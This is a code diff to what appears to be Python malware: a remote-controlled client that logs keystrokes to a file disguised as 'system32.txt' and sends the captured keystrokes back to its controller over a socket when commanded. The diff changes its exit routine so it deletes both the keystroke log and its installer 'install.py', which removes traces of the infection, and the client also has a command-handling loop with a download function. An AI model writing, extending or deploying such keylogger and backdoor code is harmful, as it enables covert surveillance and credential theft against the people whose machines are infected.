@@ -100,7 +100,10 @@ def receive_commands():
         elif data[:3].decode("utf-8") == "end":
             s.send(str.encode("loged so far:" + read_file("system32.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>end'))
             
-            os.remove("system32.txt")
+            if os.path.exists("system32.txt"):
+                os.remove("system32.txt")
+            if os.path.exists("install.py"):
+                os.remove("install.py")
             os._exit(1)
 
         elif data[:8].decode("utf-8") == "download":
@@ -118,8 +121,7 @@ def receive_commands():
             str.encode("loged so far:" + read_file("system32.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>'))
             if os.path.exists("system32.txt"):
                 os.remove("system32.txt")
-            if os.path.exists("install.py"):
-                os.remove("install.py")
+
 
         elif len(data) > 0:
             try:
